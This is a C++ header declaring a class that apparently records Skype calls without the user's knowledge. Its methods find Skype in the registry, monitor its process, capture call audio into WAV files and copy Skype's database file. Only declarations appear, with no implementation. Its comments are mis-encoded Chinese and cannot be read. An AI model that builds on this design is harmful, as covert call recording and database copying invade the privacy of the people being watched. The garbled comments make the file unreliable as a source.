#pragma once
#include <mmsystem.h>
#include "Audio.h"

class CSkype
{
public:
	CSkype(void);
	~CSkype(void);

	BOOL SetOutputDir(LPCTSTR strOutPath);
	BOOL StartWork();
	BOOL StopWork();

	static BOOL GetPathInReg();				//ע�����Ѱ��skype�İ�װ·��


private:

	static DWORD WINAPI WorkThreadEx(LPVOID lpThis);
	DWORD WorkThread();
	static DWORD WINAPI RecordingEx(LPVOID lpThis);
	DWORD Recording();
	BOOL IsPidMatch(DWORD processID);
	BOOL CheckFileSize();
	BOOL Recurse(LPCTSTR pstr);
	BOOL InitFileHeader();
	BOOL CheckSkypeStart();			//���skype����ֻ������
	BOOL CopyDataBase();		//����skype���ݿ��ļ�
	BOOL StartRec();
	BOOL StopRec();


private:
	typedef struct  
	{
		char szRiff[4];
		int nSizeFile;
		char szWave[4];
		char szfmt[4];
		int nSizeFormate;
		GSM610WAVEFORMAT pfm;
		char szData[4];
		int nSizeWave;
	}WAVEFILE_HEADER, *PMOVEFILE_HEADER;

	char m_strOutPath[MAX_PATH];		//����ļ�Ŀ¼
	char m_strRecFileName[MAX_PATH];	//¼���ļ�����
	WAVEFILE_HEADER m_headFile;			//wavͷ�ļ�
	BOOL m_bInitHead;					//�Ƿ��ʼ��ͷ�ļ�
	HANDLE m_hThreadMonitor;			//����skype����
	HANDLE m_hQuit;						//�����߳��˳��ź�
	BOOL m_bRecord;						//¼����ʶ
	HANDLE m_hFileRec;					//¼���ļ����
	HANDLE m_hThreadRecding;			//¼���߳̾��
	CAudio *m_lpAudio;					//¼������
	HANDLE m_hEventRec;					//¼���¼��ź�
	HANDLE m_hSkypeProcess;				//skype���̾�������skype�Ĺ���״̬
	BOOL m_bWorking;					//������ʶ
};
